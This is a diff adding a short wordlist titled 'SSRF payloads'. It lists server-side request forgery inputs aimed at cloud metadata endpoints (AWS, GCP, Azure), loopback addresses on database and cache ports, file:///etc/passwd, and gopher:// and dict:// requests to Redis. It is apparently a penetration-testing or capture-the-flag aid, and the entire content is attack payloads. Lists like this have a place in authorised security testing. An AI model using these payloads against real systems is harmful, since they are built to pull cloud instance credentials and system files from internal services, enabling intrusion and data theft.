@@ -1,0 +1,21 @@
+# SSRF payloads
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/user-data/
+http://metadata.google.internal/computeMetadata/v1/
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://localhost/
+http://127.0.0.1/
+http://0.0.0.0/
+http://localhost:8080/
+http://localhost:3000/
+http://localhost:6379/
+http://[::1]/
+dict://localhost:6379/info
+file:///etc/passwd
+file:///flag.txt
+gopher://localhost:6379/_INFO%0A
+http://127.0.0.1:80/
+http://127.0.0.1:443/
+http://127.0.0.1:8443/
+http://127.0.0.1:9200/
+http://127.0.0.1:27017/
